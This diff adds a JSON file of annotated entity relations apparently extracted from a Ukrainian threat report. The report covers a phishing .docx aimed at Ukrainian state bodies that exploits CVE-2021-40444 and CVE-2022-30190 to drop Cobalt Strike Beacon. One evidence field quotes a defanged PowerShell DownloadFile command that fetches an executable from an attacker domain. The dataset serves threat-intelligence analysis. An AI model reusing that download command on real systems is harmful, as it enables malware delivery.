@@ -1,0 +1,60 @@
+{
+  "relations": [
+    {
+      "head": "nod-update[.]it",
+      "type": "hosts-file",
+      "tail": "ms-msdt.exe",
+      "evidence": "DownloadFile('hXXps://nod-update[.]it/ms-msdt.exe','C:\\Users\\Public\\ms-msdt.exe')",
+      "fit": "exact"
+    },
+    {
+      "head": "PowerShell",
+      "type": "downloads-and-executes",
+      "tail": "ms-msdt.exe",
+      "evidence": "запуску PowerShell-команди, завантаження EXE-файлу \"ms-msdt.exe\"",
+      "fit": "exact"
+    },
+    {
+      "head": "зміни оплата праці з нарахуваннями.docx",
+      "type": "targets",
+      "tail": "Україна",
+      "evidence": "розповсюджувався серед державних організацій України засобами електронної пошти",
+      "fit": "new"
+    },
+    {
+      "head": "зміни оплата праці з нарахуваннями.docx",
+      "type": "exploits-vulnerability",
+      "tail": "CVE-2021-40444",
+      "evidence": "після експлуатації вразливостей CVE-2021-40444 та CVE-2022-30190",
+      "fit": "new"
+    },
+    {
+      "head": "зміни оплата праці з нарахуваннями.docx",
+      "type": "exploits-vulnerability",
+      "tail": "CVE-2022-30190",
+      "evidence": "після експлуатації вразливостей CVE-2021-40444 та CVE-2022-30190",
+      "fit": "new"
+    },
+    {
+      "head": "ms-msdt.exe",
+      "type": "delivers",
+      "tail": "Cobalt Strike Beacon",
+      "evidence": "EXE-файлу \"ms-msdt.exe\" та ураження комп'ютера шкідливою програмою Cobalt Strike Beacon",
+      "fit": "new"
+    }
+  ],
+  "newRelationTypes": [
+    {
+      "name": "targets",
+      "definition": "The head entity aims its malicious activity or campaign at the tail country or organization."
+    },
+    {
+      "name": "exploits-vulnerability",
+      "definition": "The head entity takes advantage of the tail vulnerability to compromise a system."
+    },
+    {
+      "name": "delivers",
+      "definition": "The head file or process installs, runs, or deploys the tail malware family."
+    }
+  ]
+}
